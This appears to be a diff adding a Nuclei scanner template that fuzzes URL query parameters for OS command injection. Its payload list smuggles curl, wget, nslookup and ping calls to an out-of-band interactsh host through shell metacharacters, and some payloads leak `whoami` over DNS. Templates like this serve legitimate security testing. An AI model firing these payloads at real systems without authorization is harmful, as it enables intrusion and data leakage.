@@ -1,0 +1,56 @@
+id: possible-rce-get
+
+info:
+  name: RCE OS Detection via GET
+  author: reewardius
+  severity: critical
+  tags: fuzzing-rce,fuzzing-req
+  
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+      
+    payloads:
+      rce:
+        - "$(curl {{interactsh-url}})"
+        - "$(nslookup {{interactsh-url}})"
+        - "$(ping {{interactsh-url}})"
+        - "$(wget {{interactsh-url}})"
+        - "& nslookup {{interactsh-url}})"
+        - "&& `nslookup {{interactsh-url}}`"
+        - "; $(nslookup {{interactsh-url}})"
+        - ";`nslookup {{interactsh-url}}`"
+        - ";curl {{interactsh-url}};"
+        - ";nslookup {{interactsh-url}}"
+        - "`curl {{interactsh-url}}`"
+        - "`nslookup {{interactsh-url}}`"
+        - "`ping {{interactsh-url}}`"
+        - "`wget {{interactsh-url}}`"
+        - "http://127.0.0.1/;curl {{interactsh-url}});"
+        - "nslookup {{interactsh-url}})"
+        - "|| $(nslookup {{interactsh-url}})"
+        - "|| `nslookup {{interactsh-url}}`"
+        - "|| nslookup {{interactsh-url}}"
+        - 'nslookup `whoami`.{{interactsh-url}}'
+        - ' nslookup `whoami`.{{interactsh-url}}'
+        - ';nslookup `whoami`.{{interactsh-url}}'
+        - '&nslookup `whoami`.{{interactsh-url}}'
+        - '|nslookup `whoami`.{{interactsh-url}}'
+        - '||nslookup `whoami`.{{interactsh-url}}'
+        - '&&nslookup `whoami`.{{interactsh-url}}'
+        
+    fuzzing:
+      - part: query
+        mode: multiple
+        type: replace
+        fuzz:
+          - "{{rce}}"
+          
+    stop-at-first-match: true
+    matchers:
+      - type: word
+        part: interactsh_protocol 
+        words:
+          - "http"
+          - "dns"
